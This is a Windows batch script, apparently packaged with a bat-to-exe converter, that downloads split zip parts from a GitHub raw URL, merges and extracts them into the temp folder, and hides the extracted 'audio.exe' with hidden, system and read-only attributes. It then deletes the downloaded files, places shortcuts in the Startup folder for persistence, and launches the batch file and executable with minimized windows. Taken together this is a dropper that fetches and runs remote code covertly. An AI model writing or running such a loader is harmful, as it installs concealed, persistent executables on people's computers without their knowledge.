::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFD97dCW+GGS5E7gZ5vzo0+DJp1UYNA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal enabledelayedexpansion

:: Define paths
set "tempFolder=%temp%"
set "file1=%tempFolder%\audio.zip.1"
set "file2=%tempFolder%\audio.zip.0"
set "mergedZip=%tempFolder%\audio.zip"
set "extractedFolder=%tempFolder%\airmmy"
set "audioExe=%extractedFolder%\audio\audio.exe"
set "batFile=%~f0"
set "startupFolder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batShortcut=%startupFolder%\BatchFile.lnk"
set "exeShortcut=%startupFolder%\AudioExe.lnk"
set "internalFolder=%extractedFolder%\audio\_internal"
set "audioFolder=%extractedFolder%\audio"

:: Check if the 'airmmy' folder already exists
if exist "%extractedFolder%" (
    echo Folder 'airmmy' already exists. Skipping download, merge, and extraction.
    goto SkipDownloadAndExtract
)

:: Define URLs of the split zip files
set "url1=https://raw.githubusercontent.com/KhingEmmy/_airmmy/main/audio.zip.1"
set "url2=https://raw.githubusercontent.com/KhingEmmy/_airmmy/main/audio.zip.0"

:: Download the files using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%url1%' -OutFile '%file1%'"
if %errorlevel% neq 0 (
    echo Failed to download %url1%
    goto End
)

powershell -Command "Invoke-WebRequest -Uri '%url2%' -OutFile '%file2%'"
if %errorlevel% neq 0 (
    echo Failed to download %url2%
    goto End
)

:: Merge the files using copy
copy /b "%file2%" + "%file1%" "%mergedZip%"
if %errorlevel% neq 0 (
    echo Failed to merge files
    goto End
)

:: Extract the merged zip file using PowerShell
powershell -Command "Expand-Archive -Path '%mergedZip%' -DestinationPath '%extractedFolder%'"
if %errorlevel% neq 0 (
    echo Failed to extract %mergedZip%
    goto End
)

:: Apply attributes to the extracted folder, audio.exe, and the _internal folder
attrib +r +h +s "%extractedFolder%"
attrib +r +h +s "%audioExe%"
attrib +r +h +s "%internalFolder%"
attrib +r +h +s "%audioFolder%"

:: Clean up the downloaded and merged files
del "%file1%"
del "%file2%"
del "%mergedZip%"

:SkipDownloadAndExtract
:: Create shortcuts in the Startup folder
if not exist "%startupFolder%" (
    echo Startup folder does not exist. Exiting.
    goto End
)

:: Create a shortcut for the batch file
if not exist "%batShortcut%" (
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%batShortcut%'); $s.TargetPath = '%batFile%'; $s.WindowStyle = 7; $s.Save()"
)

:: Create a shortcut for audio.exe
if not exist "%exeShortcut%" (
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%exeShortcut%'); $s.TargetPath = '%audioExe%'; $s.WindowStyle = 7; $s.Save()"
)

:: Hide the windows of the batch file and audio.exe
powershell -Command "$ws = New-Object -ComObject WScript.Shell; $ws.Run('cmd /c %batFile%', 7, $false); $ws.Run('%audioExe%', 7, $false)"

:End
echo Done.
pause
